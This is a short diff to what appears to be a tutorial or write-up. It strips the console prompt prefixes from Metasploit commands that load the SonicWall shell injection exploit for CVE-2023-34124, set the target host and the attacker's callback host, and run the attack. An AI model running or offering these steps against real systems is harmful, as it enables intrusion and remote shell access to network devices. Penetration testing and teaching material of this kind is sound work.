@@ -23,11 +23,11 @@ msfdb reinit; msfconsole -q
 use exploits/multi/http/sonicwall_shell_injection_cve_2023_34124
 ```
 ```
-exploit(multi/http/sonicwall_shell_injection_cve_2023_34124) > set rhosts target_IP
+set rhosts target_IP
 ```
 ```
-exploit(multi/http/sonicwall_shell_injection_cve_2023_34124) > set lhost attacker_IP
+set lhost attacker_IP
 ```
 ```
-exploit(multi/http/sonicwall_shell_injection_cve_2023_34124) > run
+run
 ```
